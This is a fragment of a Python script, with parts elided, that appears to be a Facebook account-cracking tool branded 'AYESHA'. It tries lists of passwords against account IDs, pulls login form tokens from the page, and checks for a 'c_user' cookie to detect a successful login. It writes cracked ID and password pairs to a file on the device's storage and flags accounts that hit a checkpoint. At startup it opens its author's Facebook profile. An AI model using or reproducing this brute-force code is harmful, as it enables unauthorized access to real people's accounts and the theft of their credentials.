...
os.system('clear')
os.system('xdg-open https://www.facebook.com/deep.pbx7')
logo=("""
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[AYESHA-]%s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			ARIX=session.cookies.get_dict().keys()
			if "c_user" in ARIX:
				print('\r\r\033[1;37m[AYESHA-Ok] %s | %s'%(ids,pas))
				
				open('/sdcard/AYESHA-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in ARIX:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[AYESHA-CP] '+ids+' | '+pas+'\033[1;97m')
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[AYESHA-] -%s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"
